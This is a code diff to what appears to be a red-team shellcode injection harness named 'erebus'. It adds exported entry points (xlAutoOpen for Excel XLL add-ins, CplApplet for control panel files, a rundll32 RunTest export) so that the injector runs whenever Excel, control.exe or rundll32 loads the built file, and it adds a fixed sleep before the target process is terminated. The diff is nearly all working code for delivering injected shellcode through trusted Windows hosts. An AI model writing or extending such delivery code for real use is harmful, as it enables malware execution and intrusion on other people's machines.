@@ -172,17 +172,106 @@ int main(int argc, char* argv[]) {
         free(shellcode_ptr);
     
 #if CONFIG_INJECTION_MODE == 1
-    // For remote injection, we might want to resume or terminate the process
-    printf("\nPress Enter to terminate the target process...");
-    getchar();
-    
+    // For remote injection, wait before cleanup so the operator can
+    // observe the injected shellcode. When loaded inside a DLL / XLL /
+    // CPL host (Excel, control.exe, rundll32) we have no stdin, so
+    // getchar() would block the host forever - fall back to a fixed
+    // sleep in those modes.
+#   if defined(BUILD_DLL) || defined(BUILD_CPL) || defined(BUILD_XLL)
+        Sleep(15000);
+#   else
+        printf("\nPress Enter to terminate the target process...");
+        getchar();
+#   endif
+
     TerminateProcess(process_handle, 0);
     CloseHandle(process_handle);
     CloseHandle(thread_handle);
     PRINT_INFO("Target process terminated");
 #endif
-    
+
     PRINT_HEADER("TEST COMPLETE");
-    
+
     return 0;
 }
+
+// --------------------------------------------------------------------------
+// DLL / CPL / XLL entry points.
+//
+// The test-injection-* Makefile targets link this translation unit as
+// `-shared` into a .dll / .cpl / .xll for hands-on testing against the
+// corresponding host (rundll32 / control.exe / Excel). Without these
+// exports the resulting PE has no host-recognised entry point - Excel
+// in particular refuses to load an .xll that does not export
+// xlAutoOpen, which is what caused the "file format and extension
+// don't match" dialog the operator saw.
+// --------------------------------------------------------------------------
+#if defined(BUILD_XLL)
+
+extern "C" __declspec(dllexport) int WINAPI xlAutoOpen(void)
+{
+    char stub[] = "test_injection_xll";
+    char* argv[] = { stub, NULL };
+    main(1, argv);
+    return 1;
+}
+
+extern "C" __declspec(dllexport) int WINAPI xlAutoClose(void)
+{
+    return 1;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID /*reserved*/)
+{
+    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(hModule);
+    return TRUE;
+}
+
+#elif defined(BUILD_CPL)
+
+#define CPL_INIT     1
+#define CPL_GETCOUNT 2
+#define CPL_INQUIRE  3
+#define CPL_DBLCLK   5
+#define CPL_STOP     6
+#define CPL_EXIT     7
+
+extern "C" __declspec(dllexport) LONG CplApplet(HWND, UINT uMsg, LPARAM, LPARAM)
+{
+    switch (uMsg) {
+    case CPL_INIT:     return 1;
+    case CPL_GETCOUNT: return 1;
+    case CPL_INQUIRE:  return 0;
+    case CPL_DBLCLK: {
+        char stub[] = "test_injection_cpl";
+        char* argv[] = { stub, NULL };
+        main(1, argv);
+        return 0;
+    }
+    default: return 0;
+    }
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID /*reserved*/)
+{
+    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(hModule);
+    return TRUE;
+}
+
+#elif defined(BUILD_DLL)
+
+// rundll32-style entry: `rundll32 erebus_injection_test.dll,RunTest`
+extern "C" __declspec(dllexport) void CALLBACK RunTest(HWND, HINSTANCE, LPSTR, int)
+{
+    char stub[] = "test_injection_dll";
+    char* argv[] = { stub, NULL };
+    main(1, argv);
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID /*reserved*/)
+{
+    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(hModule);
+    return TRUE;
+}
+
+#endif
